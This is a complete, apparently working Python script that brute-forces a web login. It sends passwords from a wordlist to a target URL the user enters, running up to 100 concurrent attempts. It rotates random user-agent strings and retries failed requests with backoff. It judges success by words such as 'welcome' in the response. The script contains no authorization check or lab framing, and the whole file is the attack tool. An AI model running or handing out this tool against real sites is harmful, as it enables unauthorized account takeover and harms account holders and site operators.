import asyncio
import aiohttp
import logging
import tqdm
import urllib.parse
import aiofiles
from fake_useragent import UserAgent
from typing import List

# Logging Configuration
logging.basicConfig(level=logging.INFO, 
                    format='%(asctime)s - %(levelname)s - %(message)s',
                    handlers=[logging.FileHandler("attempts.log"), logging.StreamHandler()])

# Constants
DEFAULT_PASSWORD_FILE = 'passlist.txt'  # Hardcoded path to the password file
DEFAULT_SUCCESS_INDICATORS = ['logout', 'welcome', 'dashboard']  # Hardcoded success indicators
DEFAULT_MAX_CONCURRENT_REQUESTS = 100
DEFAULT_RETRY_COUNT = 3
DEFAULT_TIMEOUT = 5

def validate_url(url: str) -> bool:
    """Validate the URL format."""
    parsed_url = urllib.parse.urlparse(url)
    return bool(parsed_url.scheme and parsed_url.netloc)

async def load_passwords(file_path: str) -> List[str]:
    """Load passwords from a specified file."""
    try:
        async with aiofiles.open(file_path, encoding='utf-8') as f:
            content = await f.read()
            return content.splitlines()
    except FileNotFoundError:
        logging.error("Password list file not found.")
        exit(1)

def is_success(response_text: str) -> bool:
    """Check if the login was successful based on the response text."""
    return any(indicator in response_text.lower() for indicator in DEFAULT_SUCCESS_INDICATORS)

async def try_password(session: aiohttp.ClientSession, username: str, password: str, 
                       url: str, timeout: int) -> str:
    """Attempt to log in with the provided password."""
    ua = UserAgent()
    headers = {'User-Agent': ua.random}
    data = {'username': username, 'password': password}

    for attempt in range(DEFAULT_RETRY_COUNT):
        try:
            async with session.post(url, headers=headers, data=data, timeout=timeout) as response:
                text = await response.text()
                if response.status == 200 and is_success(text):
                    return password
                logging.debug(f"Attempting password: {password}, Status code: {response.status}")
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            logging.debug(f"Error with password '{password}': {str(e)}")
            await asyncio.sleep(2 ** attempt)  # Exponential backoff

    return None

async def limited_try_password(semaphore: asyncio.Semaphore, session: aiohttp.ClientSession, 
                                username: str, password: str, url: str, timeout: int):
    """Wrap the password try function to use a semaphore for limiting concurrent access."""
    async with semaphore:
        return await try_password(session, username, password, url, timeout)

async def main(url: str, username: str, passwords: List[str], 
                max_concurrent_requests: int, timeout: int):
    """Main function to manage password attempts."""
    if not validate_url(url):
        logging.error("Invalid URL.")
        return

    semaphore = asyncio.Semaphore(max_concurrent_requests)  # Limit concurrent requests

    async with aiohttp.ClientSession() as session:
        tasks = []
        success_password = None

        with tqdm.tqdm(total=len(passwords), desc="Attempting Passwords", unit="password") as pbar:
            for password in passwords:
                task = limited_try_password(semaphore, session, username, password, url, timeout)
                tasks.append(task)

            for future in asyncio.as_completed(tasks):
                result = await future
                pbar.update(1)
                if result:
                    success_password = result
                    print(f"\nSuccess! Username: {username}, Password: {result}")
                    break  # Exit on success

        if not success_password:
            print("All attempts failed.")

# Entry point of the script
if __name__ == '__main__':
    # Get user inputs directly
    url = input("Enter the target URL: ")
    username = input("Enter the username to test: ")

    # Load passwords from the hardcoded file
    passwords = asyncio.run(load_passwords(DEFAULT_PASSWORD_FILE))

    # Configure request parameters
    max_concurrent_requests_input = input(f"Enter max concurrent requests (default: {DEFAULT_MAX_CONCURRENT_REQUESTS}): ")
    max_concurrent_requests = int(max_concurrent_requests_input) if max_concurrent_requests_input.isdigit() else DEFAULT_MAX_CONCURRENT_REQUESTS

    timeout_input = input(f"Enter timeout in seconds (default: {DEFAULT_TIMEOUT}): ")
    timeout = int(timeout_input) if timeout_input.isdigit() else DEFAULT_TIMEOUT

    # Run the main function
    asyncio.run(main(url, username, passwords, max_concurrent_requests, timeout))
